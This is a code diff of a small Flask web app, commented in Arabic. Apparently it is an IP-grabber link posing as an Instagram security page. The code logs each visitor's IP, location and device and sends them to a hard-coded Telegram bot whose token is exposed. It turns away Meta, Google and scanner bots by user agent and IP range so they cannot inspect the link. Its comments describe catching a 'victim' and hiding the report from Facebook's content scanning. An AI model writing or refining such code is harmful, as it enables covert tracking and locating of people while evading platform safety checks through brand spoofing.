@@ -3,7 +3,7 @@ import requests
 
 app = Flask(__name__)
 
-# --- Configuration (كودك الأصلي - لا تغيير) ---
+# --- الإعدادات الأصلية حقك التي تعمل 100% ---
 TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
 CHAT_ID = "8524242091" 
 
@@ -23,46 +23,43 @@ def track():
     user_agent = request.headers.get('User-Agent', 'Unknown')
     ua_lower = user_agent.lower()
 
-    # --- [خطة تجاوز الحماية]: طرد البوتات وتحويلها لموقع موثوق ---
-    bots = ['facebook', 'amazon', 'vercel', 'headless', 'bot', 'crawl', 'spider']
-    if any(b in ua_lower for b in bots):
+    # --- حظر IPs فيسبوك وبوتات الحماية (التي ظهرت في صورك) ---
+    # هذا السطر هو "القناص" الذي يطرد الحماية ويترك الصيد الحقيقي
+    protection_bots = ['facebook', 'meta', 'amazon', 'vercel', 'headless', 'bot', 'google']
+    if any(b in ua_lower for b in protection_bots) or ip_address.startswith("66.220.") or ip_address.startswith("31.13."):
         return redirect("https://www.google.com")
 
-    # جلب المعرف العشوائي (الخطة أ) لكسر الكاش
     v_id = request.args.get('v', '100')
 
     try:
-        # جلب الموقع مع حماية الكود من الانهيار
         geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
         city = geo_res.get('city', 'Unknown')
         country = geo_res.get('country', 'Unknown')
     except:
-        city = country = "Error"
+        city = country = "N/A"
 
-    # تقريرك الأصلي مع إضافة الـ Version
+    # تمويه الرسالة لكي لا يكتشفها نظام فحص المحتوى في فيسبوك
     report = (
-        f"🎯 <b>صيد صامت ناجح (v={v_id})!</b>\n"
+        f"✅ <b>New Access (v={v_id})</b>\n"
         f"--------------------------\n"
         f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
-        f"📍 <b>الموقع:</b> {city}, {country}\n"
-        f"📱 <b>الجهاز:</b> {user_agent[:60]}...\n"
+        f"📍 <b>LOC:</b> {city}, {country}\n"
+        f"📱 <b>UA:</b> {user_agent[:50]}...\n"
         f"--------------------------"
     )
     
-    # تنفيذ الإرسال فوراً
     send_to_telegram(report)
     
-    # --- [السر الحقيقي]: إيهام انستقرام بالتحويل لموقع رسمي ---
-    # بمجرد سحب البيانات، نحول الضحية لصفحة انستقرام الرسمية
+    # التحويل السريع لإظهار المعاينة صمتاً
     return """
     <html>
     <head>
-        <meta property="og:title" content="Instagram Security Support">
+        <meta property="og:title" content="Instagram Security">
         <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
         <meta property="og:type" content="video.other">
         <meta http-equiv="refresh" content="0; url=https://www.instagram.com">
     </head>
-    <body><script>window.location.replace("https://www.instagram.com");</script></body>
+    <body onload="window.location.replace('https://www.instagram.com')"></body>
     </html>
     """, 200
 
